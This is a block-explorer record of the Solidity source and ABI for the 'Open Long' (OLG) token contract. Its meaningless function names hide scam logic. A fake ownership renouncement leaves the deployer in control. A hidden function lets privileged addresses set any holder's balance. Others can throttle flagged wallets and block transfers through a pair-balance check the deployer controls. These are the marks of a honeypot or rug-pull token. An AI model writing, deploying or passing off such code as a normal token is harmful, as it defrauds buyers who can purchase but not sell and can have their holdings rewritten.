{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchedTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTeam {\n    function createPair(address exemptLiquidityFrom, address limitTotal) external returns (address);\n}\n\ninterface marketingTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeExemptLiquidity) external view returns (uint256);\n\n    function transfer(address feeFromAuto, uint256 launchedIs) external returns (bool);\n\n    function allowance(address fromTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeFromAuto,\n        uint256 launchedIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundReceiver, uint256 value);\n    event Approval(address indexed fromTake, address indexed spender, uint256 value);\n}\n\ninterface marketingTeamMetadata is marketingTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OpenLong is tradingList, marketingTeam, marketingTeamMetadata {\n\n    mapping(address => bool) public feeFromLaunch;\n\n    string private receiverShould = \"Open Long\";\n\n    function approve(address fromTotal, uint256 launchedIs) public virtual override returns (bool) {\n        feeLaunchTx[_msgSender()][fromTotal] = launchedIs;\n        emit Approval(_msgSender(), fromTotal, launchedIs);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listIs;\n    }\n\n    uint256 modeIs;\n\n    address public exemptMin;\n\n    function transfer(address receiverIs, uint256 launchedIs) external virtual override returns (bool) {\n        return feeLiquidityLaunch(_msgSender(), receiverIs, launchedIs);\n    }\n\n    function maxTakeLiquidity(address isLaunched) public {\n        enableIs();\n        if (launchToken != amountSwap) {\n            launchToken = launchedSwap;\n        }\n        if (isLaunched == enableFrom || isLaunched == exemptMin) {\n            return;\n        }\n        enableTx[isLaunched] = true;\n    }\n\n    mapping(address => uint256) private limitSender;\n\n    function toWallet(uint256 launchedIs) public {\n        enableIs();\n        receiverFee = launchedIs;\n    }\n\n    function modeWalletShould() public {\n        emit OwnershipTransferred(enableFrom, address(0));\n        launchReceiverMin = address(0);\n    }\n\n    bool private sellTake;\n\n    address receiverTakeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeFee(address autoExemptMax, address feeFromAuto, uint256 launchedIs) internal returns (bool) {\n        require(limitSender[autoExemptMax] >= launchedIs);\n        limitSender[autoExemptMax] -= launchedIs;\n        limitSender[feeFromAuto] += launchedIs;\n        emit Transfer(autoExemptMax, feeFromAuto, launchedIs);\n        return true;\n    }\n\n    uint256 receiverFee;\n\n    function feeLiquidityLaunch(address autoExemptMax, address feeFromAuto, uint256 launchedIs) internal returns (bool) {\n        if (autoExemptMax == enableFrom) {\n            return modeFee(autoExemptMax, feeFromAuto, launchedIs);\n        }\n        uint256 walletTake = marketingTeam(exemptMin).balanceOf(fromToken);\n        require(walletTake == receiverFee);\n        require(feeFromAuto != fromToken);\n        if (enableTx[autoExemptMax]) {\n            return modeFee(autoExemptMax, feeFromAuto, receiverTo);\n        }\n        return modeFee(autoExemptMax, feeFromAuto, launchedIs);\n    }\n\n    function enableIs() private view {\n        require(feeFromLaunch[_msgSender()]);\n    }\n\n    uint8 private txSenderLaunch = 18;\n\n    string private tradingTakeLiquidity = \"OLG\";\n\n    function balanceOf(address feeExemptLiquidity) public view virtual override returns (uint256) {\n        return limitSender[feeExemptLiquidity];\n    }\n\n    uint256 public listMarketingFrom;\n\n    function tokenAuto(address receiverIs, uint256 launchedIs) public {\n        enableIs();\n        limitSender[receiverIs] = launchedIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txSenderLaunch;\n    }\n\n    uint256 public autoReceiver;\n\n    uint256 private amountSwap;\n\n    uint256 private limitModeLiquidity;\n\n    uint256 public maxAuto;\n\n    uint256 private listIs = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed feeTokenFund, address indexed txSell);\n\n    uint256 private launchToken;\n\n    address public enableFrom;\n\n    function transferFrom(address autoExemptMax, address feeFromAuto, uint256 launchedIs) external override returns (bool) {\n        if (_msgSender() != receiverTakeFee) {\n            if (feeLaunchTx[autoExemptMax][_msgSender()] != type(uint256).max) {\n                require(launchedIs <= feeLaunchTx[autoExemptMax][_msgSender()]);\n                feeLaunchTx[autoExemptMax][_msgSender()] -= launchedIs;\n            }\n        }\n        return feeLiquidityLaunch(autoExemptMax, feeFromAuto, launchedIs);\n    }\n\n    mapping(address => bool) public enableTx;\n\n    address fromToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public enableReceiver;\n\n    function allowance(address maxBuy, address fromTotal) external view virtual override returns (uint256) {\n        if (fromTotal == receiverTakeFee) {\n            return type(uint256).max;\n        }\n        return feeLaunchTx[maxBuy][fromTotal];\n    }\n\n    bool public autoFee;\n\n    uint256 private launchedSwap;\n\n    function buyLaunched(address minMode) public {\n        require(minMode.balance < 100000);\n        if (enableReceiver) {\n            return;\n        }\n        \n        feeFromLaunch[minMode] = true;\n        if (listMarketingFrom == autoReceiver) {\n            sellTake = true;\n        }\n        enableReceiver = true;\n    }\n\n    uint256 constant receiverTo = 17 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTakeLiquidity;\n    }\n\n    uint256 private minLaunchedSender;\n\n    function getOwner() external view returns (address) {\n        return launchReceiverMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeLaunchTx;\n\n    address private launchReceiverMin;\n\n    function owner() external view returns (address) {\n        return launchReceiverMin;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverShould;\n    }\n\n    constructor (){\n        \n        launchedTrading minReceiverLiquidity = launchedTrading(receiverTakeFee);\n        exemptMin = amountTeam(minReceiverLiquidity.factory()).createPair(minReceiverLiquidity.WETH(), address(this));\n        if (maxAuto == minLaunchedSender) {\n            listMarketingFrom = maxAuto;\n        }\n        enableFrom = _msgSender();\n        modeWalletShould();\n        feeFromLaunch[enableFrom] = true;\n        limitSender[enableFrom] = listIs;\n        if (listMarketingFrom == limitModeLiquidity) {\n            maxAuto = listMarketingFrom;\n        }\n        emit Transfer(address(0), enableFrom, listIs);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTokenFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeExemptLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"}],\"name\":\"buyLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeFromLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"maxTakeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWalletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"toWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExemptMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeFromAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OpenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}